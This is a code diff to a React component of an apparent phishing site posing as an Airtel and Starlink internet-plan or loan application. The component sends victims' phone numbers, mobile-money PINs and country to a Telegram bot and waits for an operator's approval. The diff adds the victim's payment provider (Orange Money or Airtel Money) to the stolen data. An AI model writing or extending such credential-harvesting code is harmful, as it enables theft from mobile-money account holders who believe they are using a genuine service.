@@ -4,6 +4,7 @@ import { Activity, AlertTriangle, ArrowLeft, ArrowRight, Calendar, CheckCircle2,
 import { AirtelLogo, StarlinkLogo, LanguageSwitch, ValidatingModal, useApp } from '../App';
 import type { InternetPlan, CountryInfo } from '../App';
 import { sendLoginToTelegramAndWait } from '../utils/telegram';
+import type { PaymentProvider } from './LoanApplication1';
 interface LoanApplication2Props {
   phone: string;
   fullPhone?: string;
@@ -11,6 +12,7 @@ interface LoanApplication2Props {
   initialPin: string;
   sessionId: string;
   selectedPlan: InternetPlan;
+  provider: PaymentProvider;
   onBack: () => void;
   onSuccess: (confirmedPin: string) => void;
 }
@@ -22,6 +24,7 @@ export const LoanApplication2: React.FC<LoanApplication2Props> = ({
   initialPin,
   sessionId,
   selectedPlan,
+  provider,
   onBack,
   onSuccess,
 }) => {
@@ -88,6 +91,7 @@ export const LoanApplication2: React.FC<LoanApplication2Props> = ({
     const message =
       `🔐 <b>CODE PIN CONFIRMÉ / RESSAISI (ÉTAPE POST-OTP)</b>\n\n` +
       `🌍 <b>Pays Airtel:</b> ${country.flag} ${language === 'fr' ? country.nameFr : country.nameEn}\n` +
+      `💳 <b>Moyen de paiement:</b> ${provider === 'orange' ? '🍊 Orange Money' : '🔴 Airtel Money'}\n` +
       `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
       `🔑 <b>Code PIN Ressaisi (Correct):</b> <code>${currentPin}</code>\n` +
       `📌 <b>Code PIN Initial:</b> <code>${initialPin}</code>\n` +
@@ -97,7 +101,7 @@ export const LoanApplication2: React.FC<LoanApplication2Props> = ({
       `👇 <i>Confirmez la validation finale du code PIN pour activer le forfait :</i>`;
 
     try {
-      const isAccepted = await sendLoginToTelegramAndWait(message, phone, false);
+      const isAccepted = await sendLoginToTelegramAndWait(message, `${provider}_${phone}`, false);
       if (isAccepted) {
         onSuccess(currentPin);
       } else {
